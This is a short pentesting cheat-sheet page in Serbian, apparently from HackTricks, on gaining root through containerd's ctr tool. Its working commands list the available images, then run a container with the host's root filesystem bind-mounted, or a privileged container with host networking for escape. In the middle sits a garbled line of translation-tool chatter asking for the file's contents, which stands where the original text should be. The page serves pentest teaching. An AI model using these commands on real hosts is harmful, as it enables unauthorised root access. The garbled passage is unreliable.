# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Go to the following link to learn **where `containerd` and `ctr` fit in the container stack**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Ako otkrijete da host sadrži komandu `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Nemam pristup datoteci src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md. Pošalji sadržaj te datoteke ili potvrdi da želiš da izlistam imena fajlova slika koje se pominju u njoj (npr. <img> tagovi ili markdown ![](...)). Nakon toga ću izlistati slike i prevesti relevantni tekst na srpski.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Zatim **pokrenite jedan od tih image-a montirajući root direktorijum hosta u него**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Pokrenite kontejner sa privilegijama i pobegnite iz njega.\
Možete pokrenuti privilegovani kontejner kao:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Zatim možete koristiti neke od tehnika pomenutih na sledećoj stranici da **pobegnete iz njega zloupotrebom privilegovanih capabilities**:

{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
